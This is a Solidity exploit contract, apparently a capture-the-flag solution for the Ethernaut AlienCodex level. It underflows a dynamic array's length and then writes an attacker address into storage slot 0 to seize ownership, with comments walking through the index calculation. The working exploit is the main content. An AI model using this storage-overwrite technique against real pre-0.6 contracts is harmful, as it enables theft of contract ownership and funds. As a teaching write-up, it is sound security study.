// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

/***
    The vulnerability is the usage of array.

    For solidity, Handle array has the below operations and features.
    1) Get the array's length. codex.length.  
    2) Can read and write each index's value for array, if index beyonds array's length, throw error.
    3) the init array's length equal zero.
    4) each index's location as this `bytes32 location = keccak256(abi.encode(1)) + index`

    Steps:
    1) call makeContact, make HackAlienCodex can call retract() and revise(uint i, bytes32 _content) functions.
    2) call  retract(), make the codex's length = 2**256-1. the init length equal 0, when sub 1, trigger underflow, get the max numbers.
        So can write each slot of the contract(AlienCodex)
    
    3) write the hacker address in one element of the array.
        the element's postion should point the slot_0.

        how to calculate the index?

        slot_index
        0,1,.......................................2*256-1

        
        The index's position
        0,1.......keccak256(abi.encode(1)............2*256-1
                        index_0(the first element's postion), the following index's position will increase 1      



        how many slots between first_value_location and last_slot_postion
            bytes32(type(uint256).max) - first_value_location
    
        which index will point the the slot_0
            (2*256-1 - first_value_location)+1 


    4) write the hacker address in this index:(2*256-1 - first_value_location)+1 


    Notice:
    Perhaps this weekness of the ability to changing the array's length. after solidity 0.6.0, Array's length only read only
    https://docs.soliditylang.org/en/latest/060-breaking-changes.html#explicitness-requirements


 */
interface AlienCodexInterface {

  function makeContact() external;

  function retract() external;

  function revise(uint i, bytes32 _content)  external;
}

contract HackAlienCodex  {

    AlienCodexInterface alienCodexContract;

    function exploit(address alienCodex,address player) external {
        
        alienCodexContract = AlienCodexInterface(alienCodex);

        // Calculate which index of the array store the hacker address
        
        // type(uint256).max ;
        uint first_value_location = uint(keccak256(abi.encode(1)));
        uint max_locaiton = 2**256-1;

        uint expected_location =  max_locaiton - first_value_location +1;

        alienCodexContract.makeContact();

        alienCodexContract.retract();

        alienCodexContract.revise(expected_location,bytes32(uint256(player))); // bytes32(bytes20(msg.sender) this should check

    }

}